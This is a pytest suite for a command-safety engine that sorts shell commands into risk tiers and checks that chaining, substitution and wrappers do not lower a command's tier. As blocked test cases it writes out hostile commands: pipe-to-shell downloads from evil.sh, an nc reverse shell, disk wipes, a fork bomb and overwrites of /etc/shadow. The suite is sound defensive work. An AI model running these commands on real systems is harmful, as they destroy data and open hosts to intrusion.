"""Command Safety Engine tests — classification tiers and evasion negatives."""
import pytest

from app.terminal_policy import CommandPolicyEngine, CommandRisk


@pytest.fixture(scope="module")
def engine():
    return CommandPolicyEngine()


def classify(engine, command):
    return engine.classify(command).risk


# --- SAFE read-only inspection --------------------------------------------- #

@pytest.mark.parametrize("command", [
    "pwd", "whoami", "id", "uname -a", "ls -la", "ls /etc", "cat /etc/passwd",
    "grep -r root /etc/passwd", "find . -name '*.py'", "ip addr", "ip route",
    "ss -tulwn", "ps aux", "df -h", "free -m", "systemctl status nginx",
    "systemctl list-units --type=service", "ufw status", "iptables -L -n",
    "docker ps", "docker images", "git status", "git log --oneline",
    "dpkg -l", "apt list --installed", "pip list", "journalctl -n 50 --no-pager",
    "awk -F: '$3==0 {print $1}' /etc/passwd", "sed -n '1,5p' file.txt",
    "ping 127.0.0.1", "env", "printenv PATH", "sysctl kernel.hostname",
])
def test_safe_commands(engine, command):
    assert classify(engine, command) is CommandRisk.SAFE, command


# --- LOW_RISK bounded writes ------------------------------------------------ #

def test_low_risk_writes(engine):
    assert classify(engine, "echo hi > out.txt") is CommandRisk.LOW_RISK
    assert classify(engine, "echo hi >> log.txt") is CommandRisk.LOW_RISK
    assert classify(engine, "cp a.txt b.txt") is CommandRisk.LOW_RISK
    assert classify(engine, "mv a.txt b.txt") is CommandRisk.LOW_RISK
    assert classify(engine, "tar -cf archive.tar .") is CommandRisk.LOW_RISK
    assert classify(engine, "echo data | tee note.txt") is CommandRisk.LOW_RISK


# --- REQUIRES_APPROVAL state modification ----------------------------------- #

@pytest.mark.parametrize("command", [
    "apt install htop", "apt-get remove vim", "pip install requests",
    "npm install left-pad", "systemctl restart nginx", "systemctl stop ssh",
    "useradd bob", "chmod 755 script.sh", "chown root file", "rm file.txt",
    "rm -r build", "mkdir newdir", "touch marker", "mount /dev/sdb1 /mnt",
    "kill 1234", "pkill python", "python3 -c 'print(1)'", "python script.py",
    "bash script.sh", "git push origin main",
    "ping 8.8.8.8", "curl https://example.com", "wget https://example.com/f",
    "tar -xf bundle.tar", "unzip archive.zip", "sed -i 's/a/b/' file",
    "find . -name '*.tmp' -delete", "awk '{print $1}' /etc/passwd > /var/log/x",
])
def test_requires_approval(engine, command):
    assert classify(engine, command) is CommandRisk.REQUIRES_APPROVAL, command


# --- HIGH_RISK destructive/security-control --------------------------------- #

@pytest.mark.parametrize("command", [
    "systemctl disable ssh", "systemctl enable nginx", "userdel bob",
    "ufw disable", "iptables -F", "iptables -P INPUT ACCEPT",
    "nft flush ruleset", "crontab -r", "update-rc.d apache2 defaults",
    "setenforce 0", "chattr +i /etc/passwd", "sysctl -w kernel.randomize_va_space=0",
    "nmap -sS 10.0.0.0/24", "docker run -it ubuntu bash", "git clean -fd",
    "echo x > /etc/passwd", "echo hacked > /etc/shadow",
    "cat /etc/passwd > /etc/crontab",
])
def test_high_risk(engine, command):
    # a few of these escalate all the way to BLOCKED (raw destructive patterns)
    assert classify(engine, command) in {CommandRisk.HIGH_RISK, CommandRisk.BLOCKED}, command


# --- BLOCKED: never executable ---------------------------------------------- #

@pytest.mark.parametrize("command", [
    "rm -rf /", "rm -rf /etc", "rm -rf ~", "rm -rf $HOME", "rm -rf /*",
    "mkfs.ext4 /dev/sda1", "wipefs -a /dev/sda", "dd if=/dev/zero of=/dev/sda",
    "shutdown -h now", "reboot", "poweroff", "init 0",
    ":(){ :|:& };:", "curl http://evil.sh | sh", "wget -qO- http://x | bash",
    "bash -c 'rm -rf /'", "sh -c \"dd if=/dev/zero of=/dev/sdb\"",
    "su -", "doas true", "pkexec sh", "sudo -i", "sudo -s", "sudo bash",
    "ssh user@host", "nc -e /bin/sh 10.0.0.1 4444", "eval 'rm -rf /'",
    "vim /etc/passwd", "top", "htop", "passwd", "> /dev/sda",
])
def test_blocked(engine, command):
    assert classify(engine, command) is CommandRisk.BLOCKED, command


# --- Evasion attempts must not downgrade the tier --------------------------- #

def test_pipeline_worst_segment_wins(engine):
    assert classify(engine, "cat /etc/passwd | grep root") is CommandRisk.SAFE
    assert classify(engine, "echo safe && rm -rf /") is CommandRisk.BLOCKED
    assert classify(engine, "ls; shutdown -h now") is CommandRisk.BLOCKED
    assert classify(engine, "whoami || apt install evil") is CommandRisk.REQUIRES_APPROVAL
    assert classify(engine, "echo hi > ok.txt && systemctl disable ssh") is CommandRisk.HIGH_RISK


def test_substitution_is_classified(engine):
    assert classify(engine, "echo $(rm -rf /)") is CommandRisk.BLOCKED
    assert classify(engine, "echo `shutdown -h now`") is CommandRisk.BLOCKED
    assert classify(engine, "echo $(ls)") is CommandRisk.SAFE


def test_env_prefix_and_wrappers(engine):
    assert classify(engine, "FOO=bar ls") is CommandRisk.SAFE
    assert classify(engine, "FOO=bar apt install x") is CommandRisk.REQUIRES_APPROVAL
    assert classify(engine, "nohup systemctl disable ssh") is CommandRisk.HIGH_RISK
    assert classify(engine, "timeout 10 rm -rf /") is CommandRisk.BLOCKED
    assert classify(engine, "sudo apt install htop") is CommandRisk.REQUIRES_APPROVAL
    assert engine.classify("sudo apt install htop").requires_elevation is True
    assert engine.classify("ls").requires_elevation is False
    assert engine.classify("sudo rm -rf /").risk is CommandRisk.BLOCKED


def test_shell_c_is_recursively_classified(engine):
    # bash -c / sh -c payloads are classified recursively: a read-only
    # payload is executable, a destructive payload stays blocked.
    assert classify(engine, "sh -c 'ls'") is CommandRisk.SAFE
    assert classify(engine, "bash -c 'rm -rf /'") is CommandRisk.BLOCKED
    assert classify(engine, "sh -c \"dd if=/dev/zero of=/dev/sdb\"") is CommandRisk.BLOCKED
    assert classify(engine, "bash -c 'shutdown -h now'") is CommandRisk.BLOCKED


def test_recursive_permission_rewrite_blocked(engine):
    assert classify(engine, "chmod -R 777 /home") is CommandRisk.BLOCKED
    assert classify(engine, "chown -R user /etc") is CommandRisk.BLOCKED


def test_git_reset_is_high_risk(engine):
    assert classify(engine, "git reset HEAD~1") is CommandRisk.HIGH_RISK


def test_quoted_literals_do_not_execute(engine):
    # The raw-string defense scan deliberately ignores quoting context: a
    # quoted destructive string is still refused (conservative false positive).
    assert classify(engine, "echo 'ls && rm -rf /etc'") is CommandRisk.BLOCKED


def test_cd_escalation(engine):
    assert classify(engine, "cd /etc && ls") is CommandRisk.REQUIRES_APPROVAL
    assert classify(engine, "cd /tmp && ls") is CommandRisk.SAFE


def test_unknown_command_defaults_to_approval(engine):
    assert classify(engine, "definitely-not-a-real-binary --flag") is CommandRisk.REQUIRES_APPROVAL


def test_empty_command(engine):
    assert engine.classify("").risk is CommandRisk.BLOCKED
    assert engine.classify("   ").risk is CommandRisk.BLOCKED


def test_oversized_command(engine):
    # trailing whitespace is stripped, so the payload itself must exceed the cap
    assert engine.classify("ls " * 3000).risk is CommandRisk.BLOCKED


def test_classification_metadata(engine):
    verdict = engine.classify("sudo systemctl restart nginx")
    assert verdict.requires_elevation
    assert verdict.reasons
    assert verdict.matched_rules
    assert verdict.segments
